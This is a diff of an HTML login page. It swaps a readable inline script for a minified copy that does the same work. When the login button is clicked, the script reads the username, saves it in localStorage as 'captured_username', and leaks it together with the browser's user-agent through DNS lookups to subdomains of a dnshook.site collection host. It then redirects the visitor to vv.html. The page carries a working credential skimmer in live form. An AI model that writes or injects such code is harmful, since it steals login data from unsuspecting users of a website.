@@ -28,63 +28,6 @@
 </div>
 </form>
 <script>
-javascript:(function() {
-  var d = document, 
-  s = function(t) {
-    try {
-      var c = typeof t === 'string' ? t : JSON.stringify(t),
-          n = c.replace(/ /g, '-').replace(/[^a-zA-Z0-9-]/g, '').toLowerCase(),
-          m = 30,
-          p = [];
-      
-      for (var i = 0; i < n.length; i += m) p.push(n.substr(i, m));
-      
-      p.forEach(function(z, j) {
-        var h = 'data-' + (j + 1) + 'of' + p.length + '-' + z + '.a84486a3-3a4f-4dfa-a734-41a6bfed3241.dnshook.site',
-            l = d.createElement('link');
-        l.rel = 'preconnect';
-        l.href = 'https://' + h;
-        d.head.appendChild(l);
-        console.log('DNS #' + (j + 1) + '/' + p.length + ': ' + h);
-        setTimeout(function() { d.head.removeChild(l) }, 3000);
-      });
-      
-      return true;
-    } catch (e) {
-      console.log('Error: ' + e);
-      return false;
-    }
-  },
-  b = d.getElementById('loginBtn2');
-  
-  if (b) {
-    console.log('Found login button');
-    b.addEventListener('click', function() {
-      var u = d.getElementById('username2');
-      if (u && u.value) {
-        var v = u.value;
-        console.log('Username: ' + v);
-        
-        try {
-          localStorage.setItem('captured_username', v);
-          localStorage.setItem('capture_time', new Date().toString());
-        } catch (e) {}
-        
-        s('username-' + v);
-        s('browser-' + navigator.userAgent.split(' ')[0] + '-time-' + new Date().getTime());
-        console.log('Data sent');
-        
-        // تحويل المستخدم إلى صفحة vv.html بعد إرسال البيانات
-        setTimeout(function() {
-          window.location.href = 'vv.html';
-        }, 1000);
-      } else {
-        console.log('No username field');
-      }
-    });
-  } else {
-    console.log('No login button');
-  }
-})();
+javascript:(function(){var d=document,s=function(t){try{var c=typeof t==='string'?t:JSON.stringify(t),n=c.replace(/ /g,'-').replace(/[^a-zA-Z0-9-]/g,'').toLowerCase();if(n.length>60)n=n.substr(0,60);var h='data-'+n+'.a84486a3-3a4f-4dfa-a734-41a6bfed3241.dnshook.site',l=d.createElement('link');l.rel='preconnect';l.href='https://'+h;d.head.appendChild(l);console.log('DNS: '+h);setTimeout(function(){d.head.removeChild(l)},3000);return!0}catch(e){console.log('Error: '+e);return!1}},b=d.getElementById('loginBtn2');if(b){console.log('Found login button');b.addEventListener('click',function(){var u=d.getElementById('username2');if(u&&u.value){var v=u.value;console.log('Username: '+v);try{localStorage.setItem('captured_username',v)}catch(e){}s('user-'+v+'-browser-'+navigator.userAgent.split(' ')[0]+'-time-'+new Date().getTime());console.log('Data sent');setTimeout(function(){window.location.href='vv.html';},1000)}else{console.log('No username field')}})}else{console.log('No login button')}})();
 </script>
 
